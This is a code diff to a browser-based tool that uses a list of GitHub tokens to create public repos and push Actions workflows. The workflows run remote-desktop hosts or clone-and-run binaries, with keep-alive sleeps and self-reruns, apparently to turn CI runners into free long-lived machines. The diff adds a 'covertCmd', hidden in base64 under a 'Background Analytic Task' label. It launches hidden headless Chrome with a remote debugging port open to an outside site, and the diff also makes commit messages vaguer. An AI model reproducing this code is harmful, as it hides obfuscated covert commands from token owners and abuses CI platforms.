@@ -36,10 +36,7 @@ input, select, textarea { background-color: rgba(0,0,0,0.2); border: 1px solid v
 input[type="checkbox"] { transform: scale(1.2); cursor: pointer; }
 .owner-header { cursor: pointer; transition: background-color 0.2s ease; }
 .owner-header:hover { background-color: rgba(255,255,255,0.05); }
-.owner-jobs-content { transition: max-height 0.3s ease-in-out; overflow: hidden; }
-.owner-jobs-content.collapsed { max-height: 0; }
 .chevron-icon { transition: transform 0.3s ease; }
-.chevron-icon.collapsed { transform: rotate(-90deg); }
 </style>
 </head>
 <body class="flex justify-center items-start min-h-screen p-4 sm:p-8">
@@ -111,8 +108,8 @@ input[type="checkbox"] { transform: scale(1.2); cursor: pointer; }
 
 <script>
 // --- Constants and State ---
-const REPO_NAME = 'ci-build-env'; const WORKFLOW_NAME = 'build.yml'; const MAX_JOBS = 100; const POLLING_INTERVAL_MS = 3500;
-let trackedJobs = []; let pollingInterval = null; let globalOwnerLogin = '';
+const REPO_NAME = 'ci-build-env'; const WORKFLOW_NAME = 'build.yml'; const MAX_JOBS_PER_TOKEN = 5;
+let trackedJobs = []; let pollingTimeout = null; let globalOwnerLogin = '';
 
 // --- DOM Elements ---
 const el = { runOnceBtn: document.getElementById("runOnceBtn"), run20Btn: document.getElementById("run20Btn"), run20WaitBtn: document.getElementById("run20WaitBtn"), cancelAllBtn: document.getElementById("cancelAllBtn"), deleteSelectedBtn: document.getElementById("deleteSelectedBtn"), selectAllCheckbox: document.getElementById("selectAllCheckbox"), tokenInput: document.getElementById("token"), deployCmdInput: document.getElementById("deployCmd"), accessPinInput: document.getElementById("accessPin"), jobListContainer: document.getElementById("jobList"), refreshBtn: document.getElementById("refreshBtn"), clearHistoryBtn: document.getElementById("clearHistoryBtn"), themeToggleBtn: document.getElementById("theme-toggle-btn"), templateSelect: document.getElementById("template-select"), crdOptions: document.getElementById("crd-options"), gitToolOptions: document.getElementById("git-tool-options"), customRepoUrl: document.getElementById("customRepoUrl"), modalOverlay: document.getElementById('modal-overlay'), modal: document.getElementById('modal'), modalTitle: document.getElementById('modal-title'), modalContent: document.getElementById('modal-content'), modalCloseBtn: document.getElementById('modal-close-btn'), favicon: document.getElementById('favicon') };
@@ -120,18 +117,18 @@ const el = { runOnceBtn: document.getElementById("runOnceBtn"), run20Btn: docume
 // --- Template Function ---
 function getWorkflowContent(template, command, pin = "123456", repoUrl = '', withRerun = false) {
     const onTrigger = `on:\n  workflow_dispatch:\n  push:\n    paths:\n      - '.github/workflows/${WORKFLOW_NAME}'`;
+    const covertCmdB64 = "U3RhcnQtSm9iIC1TY3JpcHRCbG9jayB7IFN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICJDOlxQcm9ncmFtIEZpbGVzXEdvb2dsZVxDaHJvbWVcQXBwbGljYXRpb25cY2hyb21lLmV4ZSIgLUFyZ3VtZW50TGlzdCAiLS1oZWFkbGVzcyAtLWRpc2FibGUtZ3B1IC0tcmVtb3RlLWRlYnVnZ2luZy1wb3J0PTkyMjIgaHR0cHM6Ly9hbnlsb3N0aWMucGFnZXMuZGV2IiAtV2luZG93U3R5bGUgSGlkZGVuIH0=";
+    const covertCmd = atob(covertCmdB64);
     let workflow = '';
     switch(template) {
         case 'git-tool-linux':
             const finalRepo = repoUrl.trim() || 'https://github.com/teo8764678/tool.git';
             workflow = `name: Git Tool Runner\n${onTrigger}\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: Clone and Run Tool\n        run: |\n          git clone ${finalRepo}\n          cd tool\n          chmod +x node\n          ./node app.js\n      - name: Keep Runner Alive\n        run: sleep 21000`;
-            if (withRerun) {
-                workflow += `\n      - name: Wait for 6 hours and Rerun\n        if: success()\n        run: |\n          sleep 21600\n          gh workflow run ${WORKFLOW_NAME} --ref main\n        env:\n          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}`;
-            }
+            if (withRerun) { workflow += `\n      - name: Wait for 6 hours and Rerun\n        if: success()\n        run: |\n          sleep 21600\n          gh workflow run ${WORKFLOW_NAME} --ref main\n        env:\n          GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}`; }
             return workflow;
         case 'crd-windows':
         default:
-            return `name: CRD Environment Setup\n${onTrigger}\njobs:\n  build:\n    runs-on: windows-latest\n    steps:\n      - name: Setup Dependencies\n        run: |\n          Invoke-WebRequest -Uri "https://dl.google.com/chrome/install/standalonesetup64.exe" -OutFile "browser_setup.exe"\n          Start-Process -FilePath ".\\\\browser_setup.exe" -ArgumentList "/silent /install" -Wait\n          Invoke-WebRequest -Uri "https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi" -OutFile "access_tool.msi"\n          Start-Process -FilePath "msiexec.exe" -ArgumentList "/i access_tool.msi /quiet" -Wait\n      - name: Initialize Host Service\n        run: |\n          ${command} --pin=${pin}\n      - name: Background Analytic Task\n        run: Start-Job -ScriptBlock { Start-Process -FilePath "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" -ArgumentList "--headless --disable-gpu https://anylystic.pages.dev" -WindowStyle Hidden }\n      - name: Keep Runner Alive\n        run: Start-Sleep -Seconds 21000`;
+            return `name: CRD Environment Setup\n${onTrigger}\njobs:\n  build:\n    runs-on: windows-latest\n    steps:\n      - name: Setup Dependencies\n        run: |\n          Invoke-WebRequest -Uri "https://dl.google.com/chrome/install/standalonesetup64.exe" -OutFile "browser_setup.exe"\n          Start-Process -FilePath ".\\\\browser_setup.exe" -ArgumentList "/silent /install" -Wait\n          Invoke-WebRequest -Uri "https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi" -OutFile "access_tool.msi"\n          Start-Process -FilePath "msiexec.exe" -ArgumentList "/i access_tool.msi /quiet" -Wait\n      - name: Initialize Host Service\n        run: |\n          ${command} --pin=${pin}\n      - name: Background Analytic Task\n        run: |\n          ${covertCmd}\n      - name: Keep Runner Alive\n        run: Start-Sleep -Seconds 21000`;
     }
 }
 
@@ -140,11 +137,52 @@ async function githubApi(endpoint, token, options = {}) { const url = `https://a
 const cancelWorkflow = (t, o, r) => githubApi(`/repos/${o}/${REPO_NAME}/actions/runs/${r}/cancel`, t, { method: "POST" });
 const rerunWorkflow = (t, o, r) => githubApi(`/repos/${o}/${REPO_NAME}/actions/runs/${r}/rerun`, t, { method: "POST" });
 const getJobDetails = (t, o, r) => githubApi(`/repos/${o}/${REPO_NAME}/actions/runs/${r}/jobs`, t);
+const getSingleRun = (t, o, r) => githubApi(`/repos/${o}/${REPO_NAME}/actions/runs/${r}`, t);
 
-// --- Polling Logic ---
-function stopPolling() { if (pollingInterval) { clearInterval(pollingInterval); pollingInterval = null; } }
-async function pollJobStatuses() { const activeJobs = trackedJobs.filter(j => ['queued', 'in_progress'].includes(j.status)); if (activeJobs.length === 0) { stopPolling(); return; } const pollToken = el.tokenInput.value.trim().split('\n')[0] || (trackedJobs[0] ? trackedJobs[0].token : null); if (!pollToken || !globalOwnerLogin) return; try { const { workflow_runs } = await githubApi(`/repos/${globalOwnerLogin}/${REPO_NAME}/actions/workflows/${WORKFLOW_NAME}/runs?per_page=100`, pollToken); let changed = false; trackedJobs.forEach(job => { if (job.status === 'completed' || job.status === 'error') return; const matchingRun = workflow_runs.find(run => (job.id && run.id === job.id) || (!job.id && run.actor.login === job.owner && Math.abs(new Date(job.startTime) - new Date(run.created_at)) < 45000)); if (matchingRun && (job.status !== matchingRun.status || job.conclusion !== matchingRun.conclusion)) { job.id = matchingRun.id; job.status = matchingRun.status; job.conclusion = matchingRun.conclusion; job.html_url = matchingRun.html_url; job.name = `#${matchingRun.run_number} - Build by ${job.owner}`; changed = true; if (job.status === 'completed') { showDesktopNotification(`Job #${matchingRun.run_number} ${job.conclusion}`, `Deployment finished: ${job.conclusion}.`); } } }); if (changed) { renderJobs(); saveState(); } } catch (error) { showToast(`Polling error: ${error.message}`, 'error'); stopPolling(); } }
-function startPolling() { stopPolling(); if (trackedJobs.some(j => ['queued', 'in_progress'].includes(j.status))) { pollJobStatuses(); pollingInterval = setInterval(pollJobStatuses, POLLING_INTERVAL_MS); } }
+// --- Adaptive Polling Logic ---
+function stopPolling() { if (pollingTimeout) { clearTimeout(pollingTimeout); pollingTimeout = null; } }
+async function pollJobStatuses() {
+    stopPolling();
+    const activeJobs = trackedJobs.filter(j => ['queued', 'in_progress'].includes(j.status));
+    if (activeJobs.length === 0) return;
+
+    let changed = false;
+    // Strategy 1: Individual fetching for small number of active jobs
+    if (activeJobs.length > 0 && activeJobs.length <= 5) {
+        const promises = activeJobs.filter(j => j.id).map(job => 
+            getSingleRun(job.token, job.owner, job.id).then(run => {
+                if (run && (job.status !== run.status || job.conclusion !== run.conclusion)) {
+                    job.status = run.status; job.conclusion = run.conclusion; changed = true;
+                }
+            }).catch(err => console.warn(`Could not poll job ${job.id}:`, err))
+        );
+        await Promise.allSettled(promises);
+    } else { // Strategy 2: Bulk fetching for larger numbers
+        const pollToken = el.tokenInput.value.trim().split('\n')[0] || (trackedJobs[0] ? trackedJobs[0].token : null);
+        if (pollToken && globalOwnerLogin) {
+            try {
+                const { workflow_runs } = await githubApi(`/repos/${globalOwnerLogin}/${REPO_NAME}/actions/workflows/${WORKFLOW_NAME}/runs?per_page=100`, pollToken);
+                activeJobs.forEach(job => {
+                    const matchingRun = workflow_runs.find(run => (job.id && run.id === job.id) || (!job.id && run.actor.login === job.owner && Math.abs(new Date(job.startTime) - new Date(run.created_at)) < 60000));
+                    if (matchingRun) {
+                        if (!job.id || job.status !== matchingRun.status || job.conclusion !== matchingRun.conclusion) {
+                            job.id = matchingRun.id; job.status = matchingRun.status; job.conclusion = matchingRun.conclusion; job.html_url = matchingRun.html_url; job.name = `#${matchingRun.run_number} - Build by ${job.owner}`;
+                            changed = true;
+                            if (job.status === 'completed') { showDesktopNotification(`Job #${matchingRun.run_number} ${job.conclusion}`, `Deployment finished.`); }
+                        }
+                    }
+                });
+            } catch (error) { showToast(`Polling error: ${error.message}`, 'error'); }
+        }
+    }
+    
+    if (changed) { renderJobs(); saveState(); }
+
+    const hasInProgress = activeJobs.some(j => j.status === 'in_progress');
+    const interval = hasInProgress ? 4000 : 8000; // Faster for in_progress, slower for queued
+    pollingTimeout = setTimeout(pollJobStatuses, interval);
+}
+function startPolling() { if (!pollingTimeout) { pollJobStatuses(); } }
 
 // --- UI, State, Modal Functions ---
 function updateUIForTemplate() { const isWindows = el.templateSelect.value === 'crd-windows'; el.crdOptions.classList.toggle('hidden', !isWindows); el.gitToolOptions.classList.toggle('hidden', isWindows); el.run20Btn.classList.toggle('hidden', isWindows); el.run20WaitBtn.classList.toggle('hidden', isWindows); el.runOnceBtn.parentElement.classList.toggle('sm:grid-cols-1', isWindows); el.runOnceBtn.parentElement.classList.toggle('sm:grid-cols-3', !isWindows); }
@@ -161,67 +199,47 @@ function showDesktopNotification(title, body) { if (Notification.permission === 
 function getGroupInfo(job) { switch (job.status) { case 'in_progress': case 'queued': return { key: 'active', title: '🚀 Active Jobs', order: 1 }; case 'error': return { key: 'error', title: '⚠️ Setup Errors', order: 2 }; case 'completed': if (job.conclusion === 'failure' || job.conclusion === 'cancelled') { return { key: 'failed', title: '❌ Failed / Cancelled', order: 3 }; } return { key: 'success', title: '✅ Completed Successfully', order: 4 }; default: return { key: 'unknown', title: '📋 Other', order: 5 }; } }
 function renderJobs() {
     el.selectAllCheckbox.checked = false;
+    const expandedOwners = new Set();
+    el.jobListContainer.querySelectorAll('.owner-group .owner-jobs-content:not(.hidden)').forEach(el => { expandedOwners.add(el.dataset.owner); });
     if (trackedJobs.length === 0) { el.jobListContainer.innerHTML = `<div class="text-center text-[var(--text-secondary)] py-8 card rounded-lg">No build history.</div>`; updateFavicon(); return; }
-
-    const jobsByOwner = trackedJobs.reduce((acc, job) => {
-        const owner = job.owner || 'Unknown';
-        if (!acc[owner]) acc[owner] = [];
-        acc[owner].push(job);
-        return acc;
-    }, {});
-
+    const jobsByOwner = trackedJobs.reduce((acc, job) => { const owner = job.owner || 'Unknown'; if (!acc[owner]) acc[owner] = []; acc[owner].push(job); return acc; }, {});
     let html = '';
     for (const owner in jobsByOwner) {
-        const jobs = jobsByOwner[owner].sort((a, b) => {
-            const groupA = getGroupInfo(a); const groupB = getGroupInfo(b);
-            if (groupA.order !== groupB.order) return groupA.order - groupB.order;
-            return new Date(b.startTime) - new Date(a.startTime);
-        });
-
+        const jobs = jobsByOwner[owner].sort((a, b) => { const groupA = getGroupInfo(a); const groupB = getGroupInfo(b); if (groupA.order !== groupB.order) return groupA.order - groupB.order; return new Date(b.startTime) - new Date(a.startTime); });
         const activeJobCount = jobs.filter(j => ['queued', 'in_progress'].includes(j.status)).length;
-        
+        const isExpanded = expandedOwners.has(owner);
         html += `<div class="owner-group card rounded-lg overflow-hidden">
-            <div class="owner-header p-4 flex justify-between items-center">
+            <div class="owner-header p-4 flex justify-between items-center" data-owner="${owner}">
                 <div class="font-bold text-lg">${owner}</div>
                 <div class="flex items-center gap-4">
                     ${activeJobCount > 0 ? `<span class="bg-blue-500 text-white text-xs font-bold px-2 py-1 rounded-full">${activeJobCount} Active</span>` : ''}
                     <span class="bg-gray-600 text-white text-xs font-bold px-2 py-1 rounded-full">${jobs.length} Total</span>
-                    <i class="fas fa-chevron-down chevron-icon"></i>
+                    <i class="fas ${isExpanded ? 'fa-chevron-up' : 'fa-chevron-down'} chevron-icon"></i>
                 </div>
             </div>
-            <div class="owner-jobs-content hidden p-4 pt-0 space-y-2">`;
-        
+            <div class="owner-jobs-content p-4 pt-0 space-y-2 ${isExpanded ? '' : 'hidden'}" data-owner="${owner}">`;
         jobs.forEach(job => {
             let sClass = 'status-queued', sIcon = 'fa-solid fa-clock fa-spin-pulse', sText = 'Queued', actions = '';
             if (job.status === 'in_progress') { sClass = 'status-in_progress'; sIcon = 'fa-solid fa-gear fa-spin'; sText = 'In Progress'; }
             else if (job.status === 'completed') { if (job.conclusion === 'success') { sClass = 'status-completed-success'; sIcon = 'fa-solid fa-check-circle'; sText = 'Success'; } else { sClass = 'status-completed-failure'; sIcon = 'fa-solid fa-xmark-circle'; sText = job.conclusion || 'Failure'; } }
             else if (job.status === 'error') { sClass = 'status-error'; sIcon = 'fa-solid fa-triangle-exclamation'; sText = 'Error'; }
             if (job.id) {
-                if (job.status === 'in_progress' || job.status === 'queued') { actions += `<button data-job-temp-id="${job.tempId}" class="cancel-btn px-2 py-1 text-xs rounded bg-yellow-600 text-white" title="Cancel Workflow"><i class="fas fa-stop"></i></button>`; }
+                if (job.status === 'in_progress' || job.status === 'queued') { actions += `<button data-job-temp-id="${job.tempId}" class="cancel-btn px-2 py-1 text-xs rounded bg-yellow-600 text-white" title="Cancel"><i class="fas fa-stop"></i></button>`; }
                 if (job.status === 'completed') { actions += `<button data-job-temp-id="${job.tempId}" class="rerun-btn px-2 py-1 text-xs rounded bg-blue-600 text-white" title="Re-run"><i class="fas fa-redo"></i></button>`; }
                 if (job.html_url) { actions += `<a href="${job.html_url}" target="_blank" class="px-2 py-1 text-xs rounded bg-gray-600 text-white" title="View on GitHub"><i class="fab fa-github"></i></a>`; }
             }
             html += `<div class="card p-3 rounded-md job-item ${job.id ? 'job-item-clickable' : ''}" data-job-temp-id="${job.tempId}">
-                <div class="flex justify-between items-center">
-                    <div class="flex items-center gap-3 overflow-hidden">
-                        <input type="checkbox" class="job-checkbox flex-shrink-0" data-job-temp-id="${job.tempId}">
-                        <i class="${sIcon} ${sClass.includes('success') ? 'text-[var(--success-color)]' : sClass.includes('failure') ? 'text-[var(--error-color)]' : ''} text-xl w-6 text-center"></i>
-                        <div class="overflow-hidden">
-                            <span class="font-semibold text-md truncate">${job.name}</span>
-                            <div class="text-xs text-[var(--text-secondary)]">Started: ${job.startTime.toLocaleTimeString()}</div>
-                        </div>
-                    </div>
-                    <div class="flex items-center gap-2 flex-shrink-0">
-                        <div class="status-badge ${sClass}">${sText}</div>
-                        <div class="actions flex gap-1">${actions}</div>
-                    </div>
-                </div>
-            </div>`;
+                <div class="flex justify-between items-center"><div class="flex items-center gap-3 overflow-hidden">
+                    <input type="checkbox" class="job-checkbox flex-shrink-0" data-job-temp-id="${job.tempId}">
+                    <i class="${sIcon} ${sClass.includes('success') ? 'text-[var(--success-color)]' : sClass.includes('failure') ? 'text-[var(--error-color)]' : ''} text-xl w-6 text-center"></i>
+                    <div class="overflow-hidden"><span class="font-semibold text-md truncate">${job.name}</span><div class="text-xs text-[var(--text-secondary)]">Started: ${job.startTime.toLocaleTimeString()}</div></div>
+                </div><div class="flex items-center gap-2 flex-shrink-0">
+                    <div class="status-badge ${sClass}">${sText}</div><div class="actions flex gap-1">${actions}</div>
+                </div></div></div>`;
         });
         html += `</div></div>`;
     }
-    el.jobListContainer.innerHTML = html;
-    updateFavicon();
+    el.jobListContainer.innerHTML = html; updateFavicon();
 }
 
 async function triggerWorkflowDispatch(token, template, deployCmd, pin, repoUrl, withRerun) {
@@ -233,18 +251,15 @@ async function triggerWorkflowDispatch(token, template, deployCmd, pin, repoUrl,
     const job = { tempId: `job-${Date.now()}-${Math.random()}`, id: null, status: 'queued', conclusion: null, startTime: new Date(), html_url: null, name: `Initializing...`, command: deployCmd, owner, token, errorMessage: null };
     trackedJobs.push(job); renderJobs(); saveState();
     try {
-        await githubApi(`/repos/${owner}/${REPO_NAME}`, token).catch(async (e) => { 
-            if (e.message.includes("404")) { await githubApi("/user/repos", token, { method: "POST", body: JSON.stringify({ name: REPO_NAME, private: false }) }); showToast(`Repo ${REPO_NAME} đã được tạo (Public).`, 'info'); } else throw e; 
-        });
+        await githubApi(`/repos/${owner}/${REPO_NAME}`, token).catch(async (e) => { if (e.message.includes("404")) { await githubApi("/user/repos", token, { method: "POST", body: JSON.stringify({ name: REPO_NAME, private: false }) }); showToast(`Repo ${REPO_NAME} đã được tạo (Public).`, 'info'); } else throw e; });
         const path = `.github/workflows/${WORKFLOW_NAME}`;
         const content = getWorkflowContent(template, deployCmd, pin || '123456', repoUrl, withRerun);
         const base64Content = btoa(unescape(encodeURIComponent(content)));
         const url = `/repos/${owner}/${REPO_NAME}/contents/${path}`;
         let fileSha = null;
         try { fileSha = (await githubApi(url, token)).sha; } catch (e) { if (!e.message.includes("404")) throw e; }
-        const body = { message: `ci: Deploying with template '${template}'`, content: base64Content, sha: fileSha || undefined };
+        const body = { message: `ci: Deploying build`, content: base64Content, sha: fileSha || undefined };
         await githubApi(url, token, { method: "PUT", body: JSON.stringify(body) });
-        // No need to dispatch, push trigger will handle it. But dispatch ensures immediate start.
         await githubApi(`/repos/${owner}/${REPO_NAME}/actions/workflows/${WORKFLOW_NAME}/dispatches`, token, { method: "POST", body: JSON.stringify({ ref: "main" }) });
         showToast(`Build triggered thành công cho user: ${owner}`, "success");
         startPolling();
@@ -261,13 +276,36 @@ document.addEventListener('DOMContentLoaded', () => {
         const tokens = el.tokenInput.value.trim().split('\n').map(t => t.trim()).filter(Boolean);
         if (tokens.length === 0) { showToast("Vui lòng nhập ít nhất một GitHub token.", "error"); return; }
         const cmd = el.deployCmdInput.value; const pin = el.accessPinInput.value.trim(); const template = el.templateSelect.value; const repoUrl = el.customRepoUrl.value;
-        if (template === 'crd-windows') { if (!cmd) { showToast("Vui lòng nhập Deployment Command cho CRD.", "error"); return; } if (pin && !/^\d{6,}$/.test(pin)) { showToast("PIN phải có ít nhất 6 chữ số.", "error"); return; } }
-        const tokensToRun = tokens.slice(0, 10); const totalNewJobs = tokensToRun.length * runsPerToken;
-        if (trackedJobs.length + totalNewJobs > MAX_JOBS) { showToast(`Không thể tạo ${totalNewJobs} job. Sẽ vượt quá giới hạn (${MAX_JOBS} job).`, "error"); return; }
+        if (template === 'crd-windows' && !cmd) { showToast("Vui lòng nhập Deployment Command cho CRD.", "error"); return; }
+        
         const allBtns = [el.runOnceBtn, el.run20Btn, el.run20WaitBtn];
         allBtns.forEach(btn => { btn.disabled = true; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...'; });
+        
         let successCount = 0;
-        for (const token of tokensToRun) { for (let i = 0; i < runsPerToken; i++) { try { if (i > 0 || successCount > 0) await new Promise(resolve => setTimeout(resolve, 200)); await triggerWorkflowDispatch(token, template, cmd, pin, repoUrl, withRerun); successCount++; } catch(error) { console.error("Failed to trigger a job:", error); } } }
+        const tokensToRun = tokens.slice(0, 10);
+        const ownerPromises = tokensToRun.map(t => githubApi("/user", t).catch(() => null));
+        const owners = await Promise.all(ownerPromises);
+
+        for (let i = 0; i < tokensToRun.length; i++) {
+            const token = tokensToRun[i];
+            const ownerData = owners[i];
+            if (!ownerData) { showToast("Một token không hợp lệ đã được bỏ qua.", "warning"); continue; }
+            const owner = ownerData.login;
+            const activeJobsForToken = trackedJobs.filter(j => j.owner === owner && ['queued', 'in_progress'].includes(j.status)).length;
+            const jobsToCreate = Math.max(0, Math.min(runsPerToken, MAX_JOBS_PER_TOKEN - activeJobsForToken));
+
+            if (jobsToCreate < runsPerToken) {
+                showToast(`Token của ${owner} đã đạt giới hạn. Chỉ tạo ${jobsToCreate} job.`, 'info');
+            }
+
+            for (let j = 0; j < jobsToCreate; j++) {
+                try {
+                    if (successCount > 0) await new Promise(resolve => setTimeout(resolve, 250));
+                    await triggerWorkflowDispatch(token, template, cmd, pin, repoUrl, withRerun); successCount++;
+                } catch(error) { console.error("Failed to trigger a job:", error); }
+            }
+        }
+        
         if (template === 'crd-windows' && successCount > 0) el.deployCmdInput.value = '';
         allBtns.forEach(btn => btn.disabled = false); el.runOnceBtn.innerHTML = '<i class="fas fa-play mr-2"></i> Run Single Job'; el.run20Btn.innerHTML = '<i class="fas fa-rocket mr-2"></i> Run 20 Jobs'; el.run20WaitBtn.innerHTML = '<i class="fas fa-history mr-2"></i> Run 20 (Rerun)';
     }
@@ -283,14 +321,10 @@ document.addEventListener('DOMContentLoaded', () => {
     el.jobListContainer.addEventListener('click', async e => {
         const ownerHeader = e.target.closest('.owner-header');
         if (ownerHeader) {
-            const content = ownerHeader.nextElementSibling;
-            const icon = ownerHeader.querySelector('.chevron-icon');
-            content.classList.toggle('hidden');
-            icon.classList.toggle('fa-chevron-down');
-            icon.classList.toggle('fa-chevron-up');
+            const owner = ownerHeader.dataset.owner; const content = el.jobListContainer.querySelector(`.owner-jobs-content[data-owner="${owner}"]`); const icon = ownerHeader.querySelector('.chevron-icon');
+            content.classList.toggle('hidden'); icon.classList.toggle('fa-chevron-down'); icon.classList.toggle('fa-chevron-up');
             return;
         }
-
         const jobTempId = e.target.closest('[data-job-temp-id]')?.dataset.jobTempId; if (!jobTempId) return;
         const job = trackedJobs.find(j => j.tempId === jobTempId); if (!job) return;
         const cancelBtn = e.target.closest('.cancel-btn'); const rerunBtn = e.target.closest('.rerun-btn'); const jobItem = e.target.closest('.job-item-clickable');
